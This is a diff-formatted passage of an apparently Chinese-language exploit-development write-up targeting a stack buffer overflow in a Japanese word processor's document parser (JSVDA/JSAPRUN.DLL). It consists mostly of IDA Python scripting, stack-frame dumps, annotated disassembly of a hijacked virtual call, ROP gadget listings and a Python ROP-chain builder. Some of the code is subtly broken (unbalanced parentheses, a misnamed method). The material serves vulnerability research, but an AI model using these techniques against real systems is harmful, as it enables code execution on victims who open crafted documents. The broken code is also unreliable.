-[16] +0x3a6fae : 0x3be26fae..0x3be27048 : (1) FvT+ : __thiscall struc_3a9de4::readBoxHeader?_3a6fae                  : lvars:0024 args:2 refs:2   exits:1
-[17] +0x3a7664 : 0x3be27664..0x3be276be : (1) FvT+ :    __cdecl object_OSEG::read_ushort_3a7664                      : lvars:001c args:2 refs:90  exits:1
-[18] +0x3a96ed : 0x3be296ed..0x3be2972f : (1) F-D+ : __thiscall struc_3a9de4::get_flagField_3a96ed                   : lvars:0008 args:2 refs:2   exits:1
-[19] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* :    __cdecl object_9c2044::readStyleType(1000)_4d951d            : lvars:18d4 args:4 refs:1   exits:1
-[20] +0x6bf3a6 : 0x3c13f3a6..0x3c13f3e7 : (1) FvD+ : __thiscall object_9c2d50::create_field(64)_6bf3a6               : lvars:0020 args:1 refs:7   exits:1
-[21] +0x779662 : 0x3c1f9662..0x3c1f96c0 : (1) F-t+ : __thiscall sub_3C1F9662                                         : lvars:0004 args:2 refs:3   exits:1
-[22] +0x779828 : 0x3c1f9828..0x3c1f98ad : (1) FvD* : __thiscall object_9e82a0::deserialize_field_779828              : lvars:0028 args:2 refs:1   exits:1
-[23] +0x77a7bf : 0x3c1fa7bf..0x3c1fa892 : (1) FvD* : __thiscall object_e7480::readStyleType(1002)_77a7bf             : lvars:0028 args:6 refs:1   exits:1
-[24] +0x7b15a6 : 0x3c2315a6..0x3c23161a : (1) FvD+ : __thiscall object_10cbd2::get_field(38)_7b15a6                  : lvars:001c args:2 refs:36  exits:1
-[25] +0x7b9e07 : 0x3c239e07..0x3c239e7c : (1) FvD+ : __thiscall object_10cbd2::get_field(34)_7b9e07                  : lvars:001c args:2 refs:98  exits:1
-[26] +0x861925 : 0x3c2e1925..0x3c2e1993 : (1) FvD+ : __thiscall object_9e82a0::method_createfield_861925             : lvars:0040 args:1 refs:2   exits:1
- 
+[0]  +0x0b8d12 : 0x3bb38d12..0x3bb38d71 : (1) FvD+ : __thiscall object_9c2d50::get_field(180)_b8d12                  : lvars:001c args:2 refs:7   exits:1
+[1]  +0x109b2a : 0x3bb89b2a..0x3bb89b9e : (1) FvD+ : __thiscall object_10cbd2::get_field(3c)_109b2a                  : lvars:001c args:2 refs:100 exits:1
+[2]  +0x1329ce : 0x3bbb29ce..0x3bbb29e8 : (1) Fvt+ :    __cdecl object_OSEG::setCurrentStreamPosition_1329ce         : lvars:0000 args:5 refs:182 exits:1
+[3]  +0x1b6bf7 : 0x3bc36bf7..0x3bc36d66 : (1) FvD* : __thiscall object_9e5ffc::readStyleType(1000)_1b6bf7            : lvars:0044 args:4 refs:1   exits:1
+[4]  +0x1b8cd2 : 0x3bc38cd2..0x3bc38d0b : (1) FvD* : __thiscall object_9e5ffc::readStyleType(1001)_1b8cd2            : lvars:0004 args:4 refs:1   exits:1
+[5]  +0x1b8f99 : 0x3bc38f99..0x3bc39723 : (1) FvD* : __thiscall object_9bd0e4::readStyleType(2001)_1b8f99            : lvars:00a0 args:7 refs:2   exits:1
+[6]  +0x1cdcf6 : 0x3bc4dcf6..0x3bc4df7b : (1) FvD* : __thiscall object_9bd184::readStyleType(2002)_1cdcf6            : lvars:0040 args:5 refs:1   exits:1
+[7]  +0x1d24a9 : 0x3bc524a9..0x3bc52bef : (1) FvD* : __thiscall object_9bd0e4::readStyleType(2001)_1d24a9            : lvars:00b4 args:6 refs:1   exits:1
+[8]  +0x1d63a3 : 0x3bc563a3..0x3bc56601 : (1) FvT* : __thiscall object_9bd120::readStyleType(2003)_1d63a3            : lvars:0094 args:5 refs:1   exits:1
+[9]  +0x391906 : 0x3be11906..0x3be11d9c : (1) FvT* : __thiscall object_9d0d30::readStyleType(2008)_391906            : lvars:00c4 args:7 refs:1   exits:2
+[10] +0x392cab : 0x3be12cab..0x3be12ee2 : (1) FvT* : __thiscall object_9d0d30::readStyleType(2010)_392cab            : lvars:0064 args:7 refs:1   exits:1
+[11] +0x393e4b : 0x3be13e4b..0x3be13f08 : (1) F-D+ :    __cdecl object_OSEG::pushCurrentStream?_393e4b               : lvars:000c args:5 refs:1   exits:1
+[12] +0x3a6bec : 0x3be26bec..0x3be26cb2 : (1) FvD* : __thiscall struc_3a9de4::readStyleType(2005)_3a6bec             : lvars:0014 args:4 refs:1   exits:1
+[13] +0x3a6cf0 : 0x3be26cf0..0x3be26d44 : (1) FvD+ :    __cdecl object_OSEG::decode_long_3a6cf0                      : lvars:001c args:2 refs:86  exits:1
+[14] +0x3a6d44 : 0x3be26d44..0x3be26d8b : (1) FvT+ : __thiscall box_header::deserialize_3a6d44                       : lvars:000c args:2 refs:7   exits:1
+[15] +0x3a6d8b : 0x3be26d8b..0x3be26fae : (1) F-T+ : __thiscall struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b : lvars:0008 args:2 refs:11  exits:1
+[16] +0x3a6fae : 0x3be26fae..0x3be27048 : (1) FvT+ : __thiscall struc_3a9de4::readBoxHeader?_3a6fae                  : lvars:0024 args:2 refs:2   exits:1
+[17] +0x3a7664 : 0x3be27664..0x3be276be : (1) FvT+ :    __cdecl object_OSEG::read_ushort_3a7664                      : lvars:001c args:2 refs:90  exits:1
+[18] +0x3a96ed : 0x3be296ed..0x3be2972f : (1) F-D+ : __thiscall struc_3a9de4::get_flagField_3a96ed                   : lvars:0008 args:2 refs:2   exits:1
+[19] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* :    __cdecl object_9c2044::readStyleType(1000)_4d951d            : lvars:18d4 args:4 refs:1   exits:1
+[20] +0x6bf3a6 : 0x3c13f3a6..0x3c13f3e7 : (1) FvD+ : __thiscall object_9c2d50::create_field(64)_6bf3a6               : lvars:0020 args:1 refs:7   exits:1
+[21] +0x779662 : 0x3c1f9662..0x3c1f96c0 : (1) F-t+ : __thiscall sub_3C1F9662                                         : lvars:0004 args:2 refs:3   exits:1
+[22] +0x779828 : 0x3c1f9828..0x3c1f98ad : (1) FvD* : __thiscall object_9e82a0::deserialize_field_779828              : lvars:0028 args:2 refs:1   exits:1
+[23] +0x77a7bf : 0x3c1fa7bf..0x3c1fa892 : (1) FvD* : __thiscall object_e7480::readStyleType(1002)_77a7bf             : lvars:0028 args:6 refs:1   exits:1
+[24] +0x7b15a6 : 0x3c2315a6..0x3c23161a : (1) FvD+ : __thiscall object_10cbd2::get_field(38)_7b15a6                  : lvars:001c args:2 refs:36  exits:1
+[25] +0x7b9e07 : 0x3c239e07..0x3c239e7c : (1) FvD+ : __thiscall object_10cbd2::get_field(34)_7b9e07                  : lvars:001c args:2 refs:98  exits:1
+[26] +0x861925 : 0x3c2e1925..0x3c2e1993 : (1) FvD+ : __thiscall object_9e82a0::method_createfield_861925             : lvars:0040 args:1 refs:2   exits:1
+ 
 # It looks like item #19, object_9c2044::readStyleType(1000)_4d951d, has more space allocated for its "lvars" than any of the others.
 ```  
   
@@ -1192,39 +1192,39 @@ object_9e5ffc::readStyleType(1000)_1b6bf7调用另一个函数来读取记录类
 ```
 # Define a few temporary functions.
 def guess_prolog(f, minimum):
-    '''Use the stackpoints to guess the prolog by searching for a minimum. Right way would be to check "$ ignore micro"...'''
-    fn, start = func.by(f), func.address(f)
-    iterable = (ea for ea, delta in func.chunks.stackpoints(f) if abs(idaapi.get_sp_delta(fn, ea)) > minimum)
-    return start, next(iterable, start)
- 
+    '''Use the stackpoints to guess the prolog by searching for a minimum. Right way would be to check "$ ignore micro"...'''
+    fn, start = func.by(f), func.address(f)
+    iterable = (ea for ea, delta in func.chunks.stackpoints(f) if abs(idaapi.get_sp_delta(fn, ea)) > minimum)
+    return start, next(iterable, start)
+ 
 # No register calls
 filter_out_register = lambda opref: not isinstance(ins.op(opref), register_t)
- 
+ 
 # Use itertools.chain to flatten results through db.functions
 flatten_calls = lambda fs: set(itertools.chain(fs, db.functions(ea=filter(func.has, map(ins.op_ref, itertools.chain(*map(func.calls, fs)))))))
- 
+ 
 # Start at style record parser, flatten the first layer of calls.
 Python> f = db.a('struc_3a9de4::parseStylesContent_3a7048')
 Python> db.functions.list(ea=flatten_calls(flatten_calls(func.calls(f))))
-[0]   +0x00140c : 0x3ba8140c..0x3ba81412 : (1) J-D* : __thiscall JSFC_2094                                            : lvars:0000 args:8 refs:2256  exits:0
-[1]   +0x089368 : 0x3bb09368..0x3bb0936e : (1) J-D* :  __stdcall JSFC_5190                                            : lvars:0000 args:2 refs:25    exits:0
-[2]   +0x090e42 : 0x3bb10e42..0x3bb10e48 : (1) J-D* : __thiscall JSFC_5438                                            : lvars:0000 args:3 refs:32    exits:0
-[3]   +0x0915ea : 0x3bb115ea..0x3bb115f0 : (1) J-D* : __thiscall JSFC_3583                                            : lvars:0000 args:2 refs:620   exits:0
+[0]   +0x00140c : 0x3ba8140c..0x3ba81412 : (1) J-D* : __thiscall JSFC_2094                                            : lvars:0000 args:8 refs:2256  exits:0
+[1]   +0x089368 : 0x3bb09368..0x3bb0936e : (1) J-D* :  __stdcall JSFC_5190                                            : lvars:0000 args:2 refs:25    exits:0
+[2]   +0x090e42 : 0x3bb10e42..0x3bb10e48 : (1) J-D* : __thiscall JSFC_5438                                            : lvars:0000 args:3 refs:32    exits:0
+[3]   +0x0915ea : 0x3bb115ea..0x3bb115f0 : (1) J-D* : __thiscall JSFC_3583                                            : lvars:0000 args:2 refs:620   exits:0
 ...
-[120] +0x8ea58a : 0x3c36a58a..0x3c36a5c1 : (1) LvD+ : __usercall __EH_prolog3_catch                                   : lvars:0000 args:1 refs:1613  exits:1
-[121] +0x8ea600 : 0x3c36a600..0x3c36a62d : (1) LvD+ : __usercall __alloca_probe                                       : lvars:0000 args:2 refs:1082  exits:1
-[122] +0x8ea914 : 0x3c36a914..0x3c36a920 : (1) LvD+ :  __unknown ___report_rangecheckfailure                          : lvars:0000 args:0 refs:104   exits:2
- 
+[120] +0x8ea58a : 0x3c36a58a..0x3c36a5c1 : (1) LvD+ : __usercall __EH_prolog3_catch                                   : lvars:0000 args:1 refs:1613  exits:1
+[121] +0x8ea600 : 0x3c36a600..0x3c36a62d : (1) LvD+ : __usercall __alloca_probe                                       : lvars:0000 args:2 refs:1082  exits:1
+[122] +0x8ea914 : 0x3c36a914..0x3c36a920 : (1) LvD+ :  __unknown ___report_rangecheckfailure                          : lvars:0000 args:0 refs:104   exits:2
+ 
 # Filter those 123 functions looking for one with a large frame size.
 Python> db.functions.list(ea=flatten_calls(func.calls(f)), frame=True, predicate=lambda f: func.frame(f).size > 0x1000)
 [0] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* : __cdecl object_9c2044::readStyleType(1000)_4d951d : lvars:18d4 args:4 refs:1 exits:1
- 
+ 
 # Search another layer deeper.
 Python> db.functions.list(ea=flatten_calls(flatten_calls(func.calls(f))), frame=True, predicate=lambda f: func.frame(f).size > 0x1000)
-[0] +0x1b6d66 : 0x3bc36d66..0x3bc36e26 : (1) F?D+ :    __cdecl object_OSEG::method_readHugeBuffer(1000)_1b6d66 : lvars:1020 args:7 refs:2 exits:1
-[1] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* :    __cdecl object_9c2044::readStyleType(1000)_4d951d       : lvars:18d4 args:4 refs:1 exits:1
-[2] +0x77ad4b : 0x3c1fad4b..0x3c1fae93 : (1) FvD+ : __thiscall sub_3C1FAD4B                                    : lvars:1074 args:1 refs:1 exits:1
- 
+[0] +0x1b6d66 : 0x3bc36d66..0x3bc36e26 : (1) F?D+ :    __cdecl object_OSEG::method_readHugeBuffer(1000)_1b6d66 : lvars:1020 args:7 refs:2 exits:1
+[1] +0x4d951d : 0x3bf5951d..0x3bf5958a : (1) FvD* :    __cdecl object_9c2044::readStyleType(1000)_4d951d       : lvars:18d4 args:4 refs:1 exits:1
+[2] +0x77ad4b : 0x3c1fad4b..0x3c1fae93 : (1) FvD+ : __thiscall sub_3C1FAD4B                                    : lvars:1074 args:1 refs:1 exits:1
+ 
 # 3 results. Record type 0x1000 looks like it's worth considering (and hence was named as such).
 ```  
   
@@ -1240,16 +1240,16 @@ object_9e5ffc::readStyleType(1000)_1b6bf7方法是否将
   
 ```
 # Backtraces for the function where we hijack execution and where we can allocate a huge stack buffer.
-Python> hijack_backtrace =                       [0x3bbb2de4, 0x3be276be, 0x3be26cb2, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
+Python> hijack_backtrace =                       [0x3bbb2de4, 0x3be276be, 0x3be26cb2, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
 Python> huge_backtrace = [0x3bc36d66, 0x3bc36bf7, 0x3be27048, 0x3be276be, 0x3be26cb2, 0x3c1faf0f, 0x3c1fb3ed, 0x3c1fb4ab, 0x3be27954]
- 
+ 
 Python> diffindex = next(index for index, (L1,L2) in enumerate(zip(hijack_backtrace[::-1], huge_backtrace[::-1])) if L1 != L2)
 Python> assert(hijack_backtrace[-diffindex] == huge_backtrace[-diffindex])
- 
+ 
 # Use the index as the common function call, and grab all the frames that are distinct.
 Python> commonframe = func.frame(hijack_backtrace[-diffindex])
 Python> hijack, huge = (listmap(func.frame, items) for items in [hijack_backtrace[:-diffindex], huge_backtrace[:-diffindex]])
- 
+ 
 # Display the functions belonging to the callstacks where we want to hijack execution,
 # and the function to use for allocating a large amount of data from the document.
 Python> pp(listmap(fcompose(func.by, func.name), hijack + [commonframe])[::-1])
@@ -1257,7 +1257,7 @@ Python> pp(listmap(fcompose(func.by, func.name), hijack + [commonframe])[::-1])
  'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
  'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
  'object_OFRM::openStreamByName?_132de4']
- 
+ 
 Python> pp(listmap(fcompose(func.by, func.name), huge + [commonframe])[::-1])
 ['object_9c2044::method_processStreams_77af0f',
  'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
@@ -1265,51 +1265,51 @@ Python> pp(listmap(fcompose(func.by, func.name), huge + [commonframe])[::-1])
  'struc_3a9de4::parseStylesContent_3a7048',
  'object_9e5ffc::readStyleType(1000)_1b6bf7',
  'object_OSEG::method_readHugeBuffer(1000)_1b6d66']
- 
+ 
 # Display the frame belonging to the function triggering the vulnerability. We will be hijacking the return
 # pointer inside this frame at -0xA8 from the frame for `object_9c2044::method_processStreams_77af0f`.
 Python> struc.right(commonframe, [frame.members for frame in hijack])[0]
 <class 'structure' name='$ F3BBB2DE4' offset=-0xb4 size=0x20>
-[0] -b4+0x2               __int16 'anonymous_0'     (<class 'int'>, 2)
-    -b2+0x2                                         [None, 2]
-[1] -b0+0x4                   int 'var_4'           (<class 'int'>, 4)
-[2] -ac+0x4               char[4] ' s'              [(<class 'int'>, 1), 4]
-[3] -a8+0x4               char[4] ' r'              [(<class 'int'>, 1), 4]
-[4] -a4+0x4   JSVDA::object_OFRM* 'ap_oframe_0'     (<class 'type'>, 4)
-[5] -a0+0x4                 char* 'ap_streamName_4' (<class 'type'>, 4)
-[6] -9c+0x4                   int 'av_flags_8'      (<class 'int'>, 4)
-[7] -98+0x4  JSVDA::object_OSEG** 'ap_result_c'     (<class 'type'>, 4)
- 
+[0] -b4+0x2               __int16 'anonymous_0'     (<class 'int'>, 2)
+    -b2+0x2                                         [None, 2]
+[1] -b0+0x4                   int 'var_4'           (<class 'int'>, 4)
+[2] -ac+0x4               char[4] ' s'              [(<class 'int'>, 1), 4]
+[3] -a8+0x4               char[4] ' r'              [(<class 'int'>, 1), 4]
+[4] -a4+0x4   JSVDA::object_OFRM* 'ap_oframe_0'     (<class 'type'>, 4)
+[5] -a0+0x4                 char* 'ap_streamName_4' (<class 'type'>, 4)
+[6] -9c+0x4                   int 'av_flags_8'      (<class 'int'>, 4)
+[7] -98+0x4  JSVDA::object_OSEG** 'ap_result_c'     (<class 'type'>, 4)
+ 
 # Display the frame belonging to the function that we can use for loading a large
 # amount of data from the document. Our data is loaded at -0x114C from the common frame.
 Python> struc.right(commonframe, [frame.members for frame in huge])[0]
 <class 'structure' name='$ F3BC36D66' offset=-0x1168 size=0x1044>
-     -1168+0xc                                                 [None, 12]
-[0]  -115c+0x4                     int 'var_1014'              (<class 'int'>, 4)
-[1]  -1158+0x4                     int 'var_1010'              (<class 'int'>, 4)
-[2]  -1154+0x4                     int 'var_100C'              (<class 'int'>, 4)
-[3]  -1150+0x4              box_header 'lv_boxHeader_1008'     <class 'structure' name='box_header' offset=-0x1150 size=0x4>
-[4]  -114c+0x1000           char[4096] 'lv_buffer(1000)_1004'  [(<class 'int'>, 1), 4096]
-[5]   -14c+0x4                     int 'lv_canary_4'           (<class 'int'>, 4)
-[6]   -148+0x4                 char[4] ' s'                    [(<class 'int'>, 1), 4]
-[7]   -144+0x4                 char[4] ' r'                    [(<class 'int'>, 1), 4]
-[8]   -140+0x4     JSVDA::object_OSEG* 'ap_oseg_0'             (<class 'type'>, 4)
-[9]   -13c+0x4                     int 'av_size_4'             (<class 'int'>, 4)
-[10]  -138+0x4                    int* 'ap_resultSize_8'       (<class 'type'>, 4)
-[11]  -134+0x4    object_9e5ffc::data* 'ap_unused_c'           (<class 'type'>, 4)
-[12]  -130+0x4       JSFC::CPtrArray** 'ap_ptrArray_10'        (<class 'type'>, 4)
-[13]  -12c+0x4       JSFC::CPtrArray** 'ap_ptrArray_14'        (<class 'type'>, 4)
-[14]  -128+0x4                     int 'avw_usedFromHeader_18' (<class 'int'>, 4)
- 
+     -1168+0xc                                                 [None, 12]
+[0]  -115c+0x4                     int 'var_1014'              (<class 'int'>, 4)
+[1]  -1158+0x4                     int 'var_1010'              (<class 'int'>, 4)
+[2]  -1154+0x4                     int 'var_100C'              (<class 'int'>, 4)
+[3]  -1150+0x4              box_header 'lv_boxHeader_1008'     <class 'structure' name='box_header' offset=-0x1150 size=0x4>
+[4]  -114c+0x1000           char[4096] 'lv_buffer(1000)_1004'  [(<class 'int'>, 1), 4096]
+[5]   -14c+0x4                     int 'lv_canary_4'           (<class 'int'>, 4)
+[6]   -148+0x4                 char[4] ' s'                    [(<class 'int'>, 1), 4]
+[7]   -144+0x4                 char[4] ' r'                    [(<class 'int'>, 1), 4]
+[8]   -140+0x4     JSVDA::object_OSEG* 'ap_oseg_0'             (<class 'type'>, 4)
+[9]   -13c+0x4                     int 'av_size_4'             (<class 'int'>, 4)
+[10]  -138+0x4                    int* 'ap_resultSize_8'       (<class 'type'>, 4)
+[11]  -134+0x4    object_9e5ffc::data* 'ap_unused_c'           (<class 'type'>, 4)
+[12]  -130+0x4       JSFC::CPtrArray** 'ap_ptrArray_10'        (<class 'type'>, 4)
+[13]  -12c+0x4       JSFC::CPtrArray** 'ap_ptrArray_14'        (<class 'type'>, 4)
+[14]  -128+0x4                     int 'avw_usedFromHeader_18' (<class 'int'>, 4)
+ 
 # List the members needed to calculate the number of bytes we need to pivot the
 # stack pointer into a buffer that contains more data read from the file.
 Python> struc.right(commonframe, [frame.members for frame in hijack])[0].list(' *')
 [2] -ac:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
 [3] -a8:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
- 
+ 
 Python> struc.right(commonframe, [frame.members for frame in huge])[0].list(index=range(8), predicate=lambda m: m.size >= 0x100)
 [4] -114c:+0x1000 char[4096] 'lv_buffer(1000)_1004' [(<class 'int'>, 1), 4096]
- 
+ 
 # Take the difference between the buffer with our stream data, and the stack
 # pointer at the point where we can execute an address of our choosing.
 Python> stack_offset_at_time_of_call = -0xA8 - 6 * 4 - 4
@@ -1333,23 +1333,23 @@ Python> -0x114c - stack_offset_at_time_of_call
 this引用对象的指针，当实现需要访问对象的属性或必要的虚拟方法时使用。控制帧指针后，我们现在可以伪造该对象并替换我们选择的要取消引用的地址作为虚拟方法表。  
   
 ```
-.text:3BBB2E1D     loc_3BBB2E1D:                           ; CODE XREF: object_OFRM::openStreamByName?_132de4+17↑j
-.text:3BBB2E1D 00C                 push    [ebp+ap_result_c]
-.text:3BBB2E20 010                 mov     ecx, [ebp+ap_oframe_0]
-.text:3BBB2E23 010                 push    0
-.text:3BBB2E25 014                 push    [ebp+av_flags_8]
-.text:3BBB2E28 018                 mov     edx, [ecx+JSVDA::object_OFRM.p_vftable_0] ; [note.exp] we control this with our frame pointer
-.text:3BBB2E2A 018                 push    0
-.text:3BBB2E2C 01C                 push    eax
-.text:3BBB2E2D 020                 push    ecx
-.text:3BBB2E2E 024                 call    dword ptr [edx+10h] ; [note.exp] our forged vftable contains our target at +0x10
-.text:3BBB2E31 00C                 lea     esp, [ebp-8]
-.text:3BBB2E34 00C                 pop     esi
-.text:3BBB2E35 008                 mov     ecx, [ebp+var_4]
-.text:3BBB2E38 008                 xor     ecx, ebp        ; StackCookie
-.text:3BBB2E3A 008                 call    __security_check_cookie(x)
-.text:3BBB2E3F 008                 leave
-.text:3BBB2E40 000                 retn
+.text:3BBB2E1D     loc_3BBB2E1D:                           ; CODE XREF: object_OFRM::openStreamByName?_132de4+17↑j
+.text:3BBB2E1D 00C                 push    [ebp+ap_result_c]
+.text:3BBB2E20 010                 mov     ecx, [ebp+ap_oframe_0]
+.text:3BBB2E23 010                 push    0
+.text:3BBB2E25 014                 push    [ebp+av_flags_8]
+.text:3BBB2E28 018                 mov     edx, [ecx+JSVDA::object_OFRM.p_vftable_0] ; [note.exp] we control this with our frame pointer
+.text:3BBB2E2A 018                 push    0
+.text:3BBB2E2C 01C                 push    eax
+.text:3BBB2E2D 020                 push    ecx
+.text:3BBB2E2E 024                 call    dword ptr [edx+10h] ; [note.exp] our forged vftable contains our target at +0x10
+.text:3BBB2E31 00C                 lea     esp, [ebp-8]
+.text:3BBB2E34 00C                 pop     esi
+.text:3BBB2E35 008                 mov     ecx, [ebp+var_4]
+.text:3BBB2E38 008                 xor     ecx, ebp        ; StackCookie
+.text:3BBB2E3A 008                 call    __security_check_cookie(x)
+.text:3BBB2E3F 008                 leave
+.text:3BBB2E40 000                 retn
 ```  
   
   
@@ -1368,13 +1368,13 @@ address-space，我们可以识别以下指令序列的许多实例。这些序�
 -0x18它的距离。当调用虚拟方法时，我们将开始实际劫持应用程序指令指针的第一阶段。  
   
 ```
-JSAPRUN.DLL     0x610202e0: add esp, dword ptr [ecx - 0x18]; ret; 
-JSAPRUN.DLL     0x61048954: add esp, dword ptr [ecx - 0x18]; dec edi; ret; 
-JSAPRUN.DLL     0x610a0265: add esp, dword ptr [ecx - 0x18]; dec edx; clc; call dword ptr [ecx + 0x56]; 
-JSAPRUN.DLL     0x610a13c6: add esp, dword ptr [ecx - 0x18]; fnstsw word ptr [eax]; clc; call dword ptr [ecx + 0x56]; 
-JSAPRUN.DLL     0x6108d2c6: add esp, dword ptr [ecx - 0x18]; fnstsw word ptr [ecx - 7]; call dword ptr [ecx - 0x7d]; 
-JSAPRUN.DLL     0x61037b04: add esp, dword ptr [ecx - 0x18]; lahf; sar esi, 1; call dword ptr [ecx + 0x68];
-JSAPRUN.DLL     0x61029acd: add esp, dword ptr [ecx - 0x18]; salc; mov cl, 0xff; call dword ptr [ecx + 0x56]
+JSAPRUN.DLL     0x610202e0: add esp, dword ptr [ecx - 0x18]; ret; 
+JSAPRUN.DLL     0x61048954: add esp, dword ptr [ecx - 0x18]; dec edi; ret; 
+JSAPRUN.DLL     0x610a0265: add esp, dword ptr [ecx - 0x18]; dec edx; clc; call dword ptr [ecx + 0x56]; 
+JSAPRUN.DLL     0x610a13c6: add esp, dword ptr [ecx - 0x18]; fnstsw word ptr [eax]; clc; call dword ptr [ecx + 0x56]; 
+JSAPRUN.DLL     0x6108d2c6: add esp, dword ptr [ecx - 0x18]; fnstsw word ptr [ecx - 7]; call dword ptr [ecx - 0x7d]; 
+JSAPRUN.DLL     0x61037b04: add esp, dword ptr [ecx - 0x18]; lahf; sar esi, 1; call dword ptr [ecx + 0x68];
+JSAPRUN.DLL     0x61029acd: add esp, dword ptr [ecx - 0x18]; salc; mov cl, 0xff; call dword ptr [ecx + 0x56]
 ```  
   
   
@@ -1396,110 +1396,110 @@ JSAPRUN.DLL     0x61029acd: add esp, dword ptr [ecx - 0x18]; salc; mov cl, 0xf
   
 ```
 class StackReceiver(object):
-    def __init__(self, receiver):
-        self._receiver = receiver
-        self._state = coro = self.__sender(receiver)
-        next(coro)
- 
-    def sender(self, receive_word):
-        release = None
-        while True:
-            while not release:
-                offset = (yield)
-                receive_word(offset)
-                adjust = (yield)
-                if adjust and isinstance(adjust, (tuple, list)):
-                    [receive_word(integer) for integer in adjust]
-                elif adjust:
-                    receive_word(dyn.block(adjust)))
-                release = (yield)
- 
-            offset = (yield)
-            receive_word(offset)
-            if isinstance(release, (tuple, list)):
-                [receive_word(integer) for integer in release]
-            else:
-                receive_word(dyn.block(release))
- 
-            adjust = (yield)
-            if adjust and isinstance(adjust, (tuple, list)): 
-                [receive_word(integer) for integer in adjust]
-            elif adjust:
-                receive_word(dyn.block(adjust)))
-                
-            release = (yield)
-        return
- 
-    def send(self, snippet, *integers):
-        '''Simulate a return.'''
-        state = self._state
-        offset, adjust, release = snippet
-        state.send(offset)
-        state.send(integers if integers else adjust)
-        state.send(release)
- 
-    def call(self, offset, *parameters):
-        '''Simulate a call.'''
-        state = self._state
-        offset, adjust, release = offset if isinstance(offset, (tuple, list)) else (offset, 0, 0)
-        state.send(offset)
-        state.send(None)
-        state.send(parameters)
- 
-    def skip(self, count):
-        '''Clean up any extra parameters assumed by the current calling convention.'''
-        state = self._state
-        if count:
-            state.send(0)
-            state.send([0] * (count - 1)) if count > 1 else state.send(None)
-            state.send(None)
-        return
- 
+    def __init__(self, receiver):
+        self._receiver = receiver
+        self._state = coro = self.__sender(receiver)
+        next(coro)
+ 
+    def sender(self, receive_word):
+        release = None
+        while True:
+            while not release:
+                offset = (yield)
+                receive_word(offset)
+                adjust = (yield)
+                if adjust and isinstance(adjust, (tuple, list)):
+                    [receive_word(integer) for integer in adjust]
+                elif adjust:
+                    receive_word(dyn.block(adjust)))
+                release = (yield)
+ 
+            offset = (yield)
+            receive_word(offset)
+            if isinstance(release, (tuple, list)):
+                [receive_word(integer) for integer in release]
+            else:
+                receive_word(dyn.block(release))
+ 
+            adjust = (yield)
+            if adjust and isinstance(adjust, (tuple, list)): 
+                [receive_word(integer) for integer in adjust]
+            elif adjust:
+                receive_word(dyn.block(adjust)))
+                
+            release = (yield)
+        return
+ 
+    def send(self, snippet, *integers):
+        '''Simulate a return.'''
+        state = self._state
+        offset, adjust, release = snippet
+        state.send(offset)
+        state.send(integers if integers else adjust)
+        state.send(release)
+ 
+    def call(self, offset, *parameters):
+        '''Simulate a call.'''
+        state = self._state
+        offset, adjust, release = offset if isinstance(offset, (tuple, list)) else (offset, 0, 0)
+        state.send(offset)
+        state.send(None)
+        state.send(parameters)
+ 
+    def skip(self, count):
+        '''Clean up any extra parameters assumed by the current calling convention.'''
+        state = self._state
+        if count:
+            state.send(0)
+            state.send([0] * (count - 1)) if count > 1 else state.send(None)
+            state.send(None)
+        return
+ 
 ### Example usage
 layout = []
 stack = StackReceiver(layout.append)
- 
+ 
 # assign %eax with the delta from our original frame to &lp_oframe_230 or &ap_oframe_0.
 # this way we can dereference it to get access to the contents of the object_OFRM.
 delta_oframe = scope_pivot['F3C1FAF0F']['ap_oframe_0'].getoffset() - scope_pivot['F3BBB2DE4'][' s'].getoffset()
 delta_oframe = scope_pivot['F3C1FAF0F']['lp_oframe_230'].getoffset() - scope_pivot['F3BBB2DE4'][' s'].getoffset()
- 
+ 
 stack.send(JSAPRUN.assign_pop_eax, delta_oframe)
 stack.send(JSAPRUN.arithmetic_add_ebp_eax)
- 
+ 
 # now we can dereference %eax to point at the object_OFRM representing our document.
 stack.send(JSAPRUN.assign_pop_esi, 0)
 stack.send(JSAPRUN.arithmetic_addload_eax_esi)
 stack.send(JSAPRUN.assign_esi_eax, 0)
- 
+ 
 # adjust %eax by +4 so that we can load the value from object_OFRM.v_index_4 into %esi.
 # the integer at this index is a handle and is all we need to create a fake object_OFRM.
 stack.send(JSAPRUN.arithmetic_add_imm4_eax)
 stack.send(JSAPRUN.assign_pop_esi, 0)
 stack.send(JSAPRUN.arithmetic_addload_eax_esi)
- 
+ 
 ...
- 
+ 
 # stash %ecx containing our context into %ebx for the purpose of preserving our context.
 # this way we can restore it later from %ebx to regain access to our current state.
 stack.send(JSAPRUN.assign_ecx_eax)
 stack.send(JSAPRUN.exchange_eax_ebx)
- 
+ 
 # void *__thiscall JSAPRUN.dll!method_mallocPageAndSurplus_7ebee(_DWORD *this, size_t av_size_0)
 # this function allocates a page (0x1000) and writes it to 0x24(%ecx). if av_0 > 0x1000, then it
 # also returns a pointer to that number of bytes and does nothing else.
 stack.call(JSAPRUN.procedure_method_mallocPageAndSurplus_7ebee, 0x1001, 0x11111111)
 stack.send(JSAPRUN.arithmetic_add_imm4_esp)
- 
+ 
 ...
- 
+ 
 # open up a stream by its name, layout.frame.stream_name. %ecx contains our fake object_OFRM.
 new_context = layout['context']['object(OSEG)']
 assert(not(divmod(new_context.int() - layout['context'].getoffset(), 4)[1])), "Result {:s} is unaligned from {:s} and will not be accessible".format(layout['context']['object(OSEG)'].instance(), layout['context'].instance())
 stack.send(JSAPRUN.assign_pop_eax, layout['object_OFRM.vftable'].getoffset())
 # int __stdcall object_OFRM::method_openStream_2b5c5(JSVDA::object_OFRM *ap_this_0, wchar_t *ap_streamName_4, int a_unused_8, char avb_flags_c, int a_unused_10, JSVDA::object_OSEG **ap_result_14)
 stack.send(JSAPRUN.callsib1_N_eax_c__ecx, layout['frame']['stream_name'].getoffset(), 0x22222222, 3, 0x33333333, new_context.getoffset())
- 
+ 
 # copy the %ebx containing our context back into %ecx.
 stack.send(JSAPRUN.assign_pop_ecx, 0)
